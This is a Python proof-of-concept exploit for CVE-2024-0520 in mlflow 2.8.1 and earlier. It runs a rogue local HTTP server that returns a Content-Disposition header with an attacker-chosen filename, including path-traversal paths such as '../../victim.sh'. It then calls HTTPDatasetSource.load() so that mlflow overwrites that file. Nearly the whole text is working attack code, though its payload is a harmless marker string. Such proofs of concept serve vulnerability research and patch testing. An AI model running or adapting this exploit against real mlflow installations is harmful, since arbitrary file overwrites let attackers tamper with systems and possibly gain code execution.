#!/usr/bin/env python3
"""
PoC exploit for CVE-2024-0520 (mlflow &lt;= 2.8.1)

USAGE:
    python exploit.py <TARGET_PATH>

<TARGET_PATH> is the exact path the attacker wants mlflow to overwrite –
e.g.  /tmp/poc.txt     (absolute path)
      ../../victim.sh  (path-traversal)

The script:
  1. starts a local HTTP server that always sends a malicious
     Content-Disposition header with filename="<TARGET_PATH>"
  2. instantiates mlflow.data.http_dataset_source.HTTPDatasetSource
     pointing at that server and calls .load()

When mlflow is vulnerable the file <TARGET_PATH> is created/overwritten with
the server’s payload.
"""

import http.server
import os
import socket
import socketserver
import sys
import threading
import time

from mlflow.data.http_dataset_source import HTTPDatasetSource

PAYLOAD = b"owned-by-cve-2024-0520\n"

def make_handler(target_path: str):
    class RogueHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(PAYLOAD)))
            self.send_header("Content-Disposition", f'attachment; filename="{target_path}"')
            self.end_headers()
            self.wfile.write(PAYLOAD)

        def log_message(self, fmt, *args):
            # silence request logs
            pass

    return RogueHandler

def main():
    if len(sys.argv) != 2:
        print("Usage: python exploit.py <TARGET_PATH>", file=sys.stderr)
        sys.exit(1)

    target_path = sys.argv[1]

    # Pick a random free TCP port
    sock = socket.socket()
    sock.bind(("", 0))
    port = sock.getsockname()[1]
    sock.close()

    # Start rogue HTTP server in the background
    handler_cls = make_handler(target_path)
    httpd = socketserver.TCPServer(("127.0.0.1", port), handler_cls)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()

    # Give the server a moment to start
    time.sleep(0.3)

    # Trigger the vulnerable code path
    src = HTTPDatasetSource(f"http://127.0.0.1:{port}/")
    src.load()          # <-- arbitrary file write happens here

    # Shutdown server and exit
    httpd.shutdown()

    # (Verification is intentionally omitted – the exploit’s job is only to trigger the bug.)

if __name__ == "__main__":
    main()